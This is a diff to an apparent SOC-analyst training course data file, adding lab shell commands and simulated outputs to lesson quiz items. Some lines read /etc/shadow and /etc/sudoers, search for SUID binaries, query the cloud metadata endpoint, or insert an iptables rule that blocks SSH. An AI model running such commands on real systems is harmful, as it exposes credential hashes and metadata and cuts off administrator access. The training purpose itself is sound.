@@ -52,7 +52,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring What Is an IT Infrastructure? on sxl-infra-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -100,7 +100,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ip 2>/dev/null || which ip"
+        "command": "ip --help 2>&1 | head -n 15 || which ip"
       },
       {
         "id": 4,
@@ -124,7 +124,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is IT Infrastructure? The unified hardware, software, and networking ecosystem that delivers digital business services.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -148,7 +148,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.254 2>/dev/null || tracepath 10.10.20.254"
+        "command": "traceroute -n -m 8 10.10.20.254 2>/dev/null || tracepath -n 10.10.20.254 2>/dev/null || ip route get 10.10.20.254"
       },
       {
         "id": 6,
@@ -179,7 +179,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-infra-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `nmap -sn 10.10.20.0/24` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `nmap -sn 10.10.20.0/24` to validate system behavior under simulated operating conditions.\nOutput observed:\nStarting Nmap 7.92 ( https://nmap.org )\nNmap scan report for 10.10.20.1 (pfSense Gateway) - Host is up (0.00041s latency)\nNmap scan report for 10.10.20.10 (sxl-infra-core01) - Host is up (0.00008s latency)\nNmap scan report for 10.10.20.77 (DEV-TEST-WIN11) - Host is up (0.0012s latency)\nMAC Address: 08:00:27:EA:12:9F (Oracle VirtualBox Virtual NIC)\nNmap done: 256 IP addresses (3 hosts up) scanned in 2.14 seconds",
         "what": "What is IT Infrastructure? The unified hardware, software, and networking ecosystem that delivers digital business services.",
         "why": "Why must an L1 understand infrastructure? You cannot defend what you do not know. If an alert fires on IP 10.10.20.77, you must immediately determine whether it is a critical database, a guest Wi-Fi device, or an unmanaged rogue machine.",
         "when": "When is infrastructure analyzed? During continuous asset discovery, perimeter posture audits, network change reviews, and initial incident scoping.",
@@ -268,7 +268,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-infra-core01'; ip route show "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -316,7 +316,7 @@ window.ACADEMY_COURSES = [
           "Infrastructure refers to software antivirus engines; hardware devices cannot be targeted by network attacks."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for What Is an IT Infrastructure?'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -340,7 +340,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L01 - What Is an IT Infrastructure?. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -393,7 +393,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Computers, Servers & Endpoints on sxl-srv-app01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -441,7 +441,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ps 2>/dev/null || which ps"
+        "command": "ps --help 2>&1 | head -n 15 || which ps"
       },
       {
         "id": 4,
@@ -465,7 +465,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are endpoints and servers? Endpoints are client machines initiating network traffic; servers are centralized hosts fulfilling client requests.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -489,7 +489,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.1 2>/dev/null || tracepath 10.10.20.1"
+        "command": "traceroute -n -m 8 10.10.20.1 2>/dev/null || tracepath -n 10.10.20.1 2>/dev/null || ip route get 10.10.20.1"
       },
       {
         "id": 6,
@@ -520,7 +520,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-srv-app01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `ss -tulpn` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `ss -tulpn` to validate system behavior under simulated operating conditions.\nOutput observed:\nNetid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\ntcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*     users:((\"sshd\",pid=891,fd=3))\ntcp   LISTEN 0      511          0.0.0.0:80         0.0.0.0:*     users:((\"nginx\",pid=1102,fd=6))\ntcp   LISTEN 0      128        127.0.0.1:3306       0.0.0.0:*     users:((\"mariadbd\",pid=1045,fd=19))",
         "what": "What are endpoints and servers? Endpoints are client machines initiating network traffic; servers are centralized hosts fulfilling client requests.",
         "why": "Why do analysts investigate process trees? Attackers rarely install obvious malware executables; they hijack legitimate background processes or spawn malicious sub-processes.",
         "when": "When is endpoint triage performed? When an EDR sensor detects unusual process spawning (e.g., Word spawning PowerShell) or high CPU anomalies.",
@@ -609,7 +609,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-srv-app01'; ps -eo pid,ppid,user,args --sort=-%mem | head -n 8"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -657,7 +657,7 @@ window.ACADEMY_COURSES = [
           "Search the process name online; if it matches standard documentation, no investigation is needed."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Computers, Servers & Endpoints'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -681,7 +681,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L02 - Computers, Servers & Endpoints. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -734,7 +734,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Operating Systems on sxl-srv-auth01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -782,7 +782,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man cat 2>/dev/null || which cat"
+        "command": "cat --help 2>&1 | head -n 15 || which cat"
       },
       {
         "id": 4,
@@ -806,7 +806,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is an Operating System? The master software platform managing computer hardware, system calls, and application execution.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -830,7 +830,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.5 2>/dev/null || tracepath 10.10.10.5"
+        "command": "traceroute -n -m 8 10.10.10.5 2>/dev/null || tracepath -n 10.10.10.5 2>/dev/null || ip route get 10.10.10.5"
       },
       {
         "id": 6,
@@ -861,7 +861,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-srv-auth01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `find / -perm -4000 -type f 2>/dev/null` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `find / -perm -4000 -type f 2>/dev/null` to validate system behavior under simulated operating conditions.\nOutput observed:\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/bin/chsh\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/pkexec\n/tmp/secret_bash (SUSPICIOUS UNTRACKED SUID BINARY)",
         "what": "What is an Operating System? The master software platform managing computer hardware, system calls, and application execution.",
         "why": "Why must an L1 master OS architecture? Attackers constantly exploit OS primitives: modifying Windows Run keys for persistence, injecting into LSASS to dump NTLM hashes, or exploiting Linux SUID binaries.",
         "when": "When are OS logs generated? On every authentication attempt, privilege escalation, process execution, and system service installation.",
@@ -950,7 +950,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-srv-auth01'; cat /etc/passwd | cut -d: -f1,3,7 | head -n 8"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -998,7 +998,7 @@ window.ACADEMY_COURSES = [
           "Both operating systems share identical registry keys to authorize root access."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Operating Systems'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -1022,7 +1022,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L03 - Operating Systems. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -1075,7 +1075,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Assets, Services & Applications on sxl-app-stack01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -1123,7 +1123,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man ss 2>/dev/null || which ss"
+        "command": "ss --help 2>&1 | head -n 15 || which ss"
       },
       {
         "id": 4,
@@ -1147,7 +1147,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are assets, services, and applications? Assets are the compute resources; services are the network-listening daemons; applications are the user-facing business tools.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -1171,7 +1171,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.20.30 2>/dev/null || tracepath 10.10.20.30"
+        "command": "traceroute -n -m 8 10.10.20.30 2>/dev/null || tracepath -n 10.10.20.30 2>/dev/null || ip route get 10.10.20.30"
       },
       {
         "id": 6,
@@ -1202,7 +1202,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-app-stack01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `curl -I http://127.0.0.1:80` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `curl -I http://127.0.0.1:80` to validate system behavior under simulated operating conditions.\nOutput observed:\nHTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nDate: Fri, 04 Sep 2026 02:15:22 GMT\nContent-Type: text/html\nContent-Length: 612\nLast-Modified: Tue, 21 Apr 2026 14:00:00 GMT\nConnection: keep-alive\nETag: \"5ea04b50-264\"\nAccept-Ranges: bytes",
         "what": "What are assets, services, and applications? Assets are the compute resources; services are the network-listening daemons; applications are the user-facing business tools.",
         "why": "Why does socket exposure matter to SOC? Binding a sensitive internal database service (MySQL, Redis, Elasticsearch) to 0.0.0.0 exposes critical data directly to the network without firewall protection.",
         "when": "When are service dependencies mapped? During threat modeling, vulnerability assessments, and blast-radius analysis following an endpoint compromise.",
@@ -1291,7 +1291,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-app-stack01'; ss -tlpn"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -1339,7 +1339,7 @@ window.ACADEMY_COURSES = [
           "Both bindings behave identically; the IP address is merely a cosmetic label in Linux."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Assets, Services & Applications'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -1363,7 +1363,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L04 - Assets, Services & Applications. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -1416,7 +1416,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Virtualization & Cloud Basics on sxl-cloud-node01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -1464,7 +1464,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man docker 2>/dev/null || which docker"
+        "command": "docker --help 2>&1 | head -n 15 || which docker"
       },
       {
         "id": 4,
@@ -1488,7 +1488,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are virtualization and cloud? Virtualization abstracts compute hardware; cloud delivers virtualized compute on demand via global networks.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -1512,7 +1512,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 169.254.169.254 2>/dev/null || tracepath 169.254.169.254"
+        "command": "traceroute -n -m 8 169.254.169.254 2>/dev/null || tracepath -n 169.254.169.254 2>/dev/null || ip route get 169.254.169.254"
       },
       {
         "id": 6,
@@ -1543,7 +1543,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-cloud-node01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `curl -s http://169.254.169.254/latest/meta-data/local-ipv4` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `curl -s http://169.254.169.254/latest/meta-data/local-ipv4` to validate system behavior under simulated operating conditions.\nOutput observed:\n10.10.20.30",
         "what": "What are virtualization and cloud? Virtualization abstracts compute hardware; cloud delivers virtualized compute on demand via global networks.",
         "why": "Why must SOC analysts master virtualization & cloud? Attackers target cloud metadata endpoints (IMDS) to steal temporary IAM credentials or break out of misconfigured containers to host roots.",
         "when": "When are cloud alerts triggered? When unusual API calls originate from unexpected IPs or when containers execute unauthorized privileged commands.",
@@ -1632,7 +1632,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-cloud-node01'; docker ps "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -1680,7 +1680,7 @@ window.ACADEMY_COURSES = [
           "IaaS means the customer manages physical hard drives while the cloud provider manages local passwords."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Virtualization & Cloud Basics'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -1704,7 +1704,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L05 - Virtualization & Cloud Basics. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -1757,7 +1757,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Users & Accounts on sxl-id-node01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -1805,7 +1805,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man whoami 2>/dev/null || which whoami"
+        "command": "whoami --help 2>&1 | head -n 15 || which whoami"
       },
       {
         "id": 4,
@@ -1829,7 +1829,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are users and accounts? The fundamental security principals that associate computational actions and data access with an authenticated identity.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -1853,7 +1853,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.12 2>/dev/null || tracepath 10.10.10.12"
+        "command": "traceroute -n -m 8 10.10.10.12 2>/dev/null || tracepath -n 10.10.10.12 2>/dev/null || ip route get 10.10.10.12"
       },
       {
         "id": 6,
@@ -1884,7 +1884,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-id-node01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `cut -d: -f1,2 /etc/shadow | grep -v '\\*' | grep -v '!'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `cut -d: -f1,2 /etc/shadow | grep -v '\\*' | grep -v '!'` to validate system behavior under simulated operating conditions.\nOutput observed:\nroot:$6$kZ9... (PASSWORD HASH PRESENT)\nanalyst:$6$pQ2... (PASSWORD HASH PRESENT)\nsvc_backup:$6$xL7... (PASSWORD HASH PRESENT)",
         "what": "What are users and accounts? The fundamental security principals that associate computational actions and data access with an authenticated identity.",
         "why": "Why must an L1 monitor account activity? Attackers do not 'break in' using complex zero-days; 80% of enterprise intrusions occur when attackers simply log in with stolen credentials.",
         "when": "When are account audits performed? During quarterly access reviews, employee offboarding, and incident triage of suspicious logon times or locations.",
@@ -1973,7 +1973,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-id-node01'; whoami "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -2021,7 +2021,7 @@ window.ACADEMY_COURSES = [
           "Both account types share identical passwords synchronized across all global computers."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Users & Accounts'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -2045,7 +2045,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L06 - Users & Accounts. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -2098,7 +2098,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Groups & Privileges on sxl-ad-dc01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -2146,7 +2146,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man groups 2>/dev/null || which groups"
+        "command": "groups --help 2>&1 | head -n 15 || which groups"
       },
       {
         "id": 4,
@@ -2170,7 +2170,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What are groups and privileges? Groups are logical collections of identities; privileges are the explicit system rights and object permissions granted to those groups.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -2194,7 +2194,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.5 2>/dev/null || tracepath 10.10.10.5"
+        "command": "traceroute -n -m 8 10.10.10.5 2>/dev/null || tracepath -n 10.10.10.5 2>/dev/null || ip route get 10.10.10.5"
       },
       {
         "id": 6,
@@ -2225,7 +2225,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-ad-dc01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `cat /etc/sudoers | grep -v '#' | grep -v '^$'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `cat /etc/sudoers | grep -v '#' | grep -v '^$'` to validate system behavior under simulated operating conditions.\nOutput observed:\nDefaults env_reset\nDefaults mail_badpass\nDefaults secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\nroot ALL=(ALL:ALL) ALL\n%admin ALL=(ALL) ALL\n%sudo ALL=(ALL:ALL) ALL",
         "what": "What are groups and privileges? Groups are logical collections of identities; privileges are the explicit system rights and object permissions granted to those groups.",
         "why": "Why do attackers target groups? Gaining membership in Domain Admins or local Administrators grants unrestricted control to disable security software, dump credentials, and deploy ransomware.",
         "when": "When are privilege changes audited? Constantly. Any addition to a privileged group (Event ID 4728 / 4732) must trigger immediate SOC alerts.",
@@ -2314,7 +2314,7 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-ad-dc01'; groups analyst "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
@@ -2362,7 +2362,7 @@ window.ACADEMY_COURSES = [
           "Privilege escalation is impossible if the firewall blocks port 80."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Groups & Privileges'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -2386,7 +2386,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L07 - Groups & Privileges. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -2439,7 +2439,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Authentication on sxl-auth-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -2487,7 +2487,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man grep 2>/dev/null || which grep"
+        "command": "grep --help 2>&1 | head -n 15 || which grep"
       },
       {
         "id": 4,
@@ -2511,7 +2511,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is authentication? The gatekeeping process that proves an identity claim before granting network or system access.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -2535,7 +2535,7 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.10.15 2>/dev/null || tracepath 10.10.10.15"
+        "command": "traceroute -n -m 8 10.10.10.15 2>/dev/null || tracepath -n 10.10.10.15 2>/dev/null || ip route get 10.10.10.15"
       },
       {
         "id": 6,
@@ -2566,7 +2566,7 @@ window.ACADEMY_COURSES = [
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-auth-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr` to validate system behavior under simulated operating conditions.\nOutput observed:\n     48 192.168.100.15\n      2 10.10.20.50",
         "what": "What is authentication? The gatekeeping process that proves an identity claim before granting network or system access.",
         "why": "Why must an L1 master authentication logs? Attackers exploit compromised credentials; differentiating a legitimate employee login from an attacker requires analyzing source IP, time, user-agent, and failure-success sequences.",
         "when": "When are authentication logs generated? On every login attempt, interactive terminal session, network share connection, and API authentication.",
@@ -2655,14 +2655,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-auth-core01'; grep -E 'Failed password|Accepted password' /var/log/auth.log | tail -n 8"
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Re-enable `pam_faillock.so` in `/etc/pam.d/common-auth`, set `deny = 5`, `unlock_time = 900`, restart SSH daemon, and test lockout enforcement.",
-        "worked": "Remediation command applied: `echo 'deny = 5\nunlock_time = 900' >> /etc/security/faillock.conf && systemctl restart sshd && echo 'PAM faillock lockout policy restored.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `faillock --user root --reset 2>/dev/null; pam-auth-update --enable faillock 2>/dev/null || systemctl restart sshd`. System verified restored and hardened.",
         "what": "What is authentication? The gatekeeping process that proves an identity claim before granting network or system access.",
         "why": "Why must an L1 master authentication logs? Attackers exploit compromised credentials; differentiating a legitimate employee login from an attacker requires analyzing source IP, time, user-agent, and failure-success sequences.",
         "when": "When are authentication logs generated? On every login attempt, interactive terminal session, network share connection, and API authentication.",
@@ -2679,7 +2679,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'deny = 5\nunlock_time = 900' >> /etc/security/faillock.conf && systemctl restart sshd && echo 'PAM faillock lockout policy restored.'"
+        "command": "faillock --user root --reset 2>/dev/null; pam-auth-update --enable faillock 2>/dev/null || systemctl restart sshd"
       },
       {
         "id": 12,
@@ -2703,7 +2703,7 @@ window.ACADEMY_COURSES = [
           "Both terms describe identical network flooding attacks on port 80."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Authentication'"
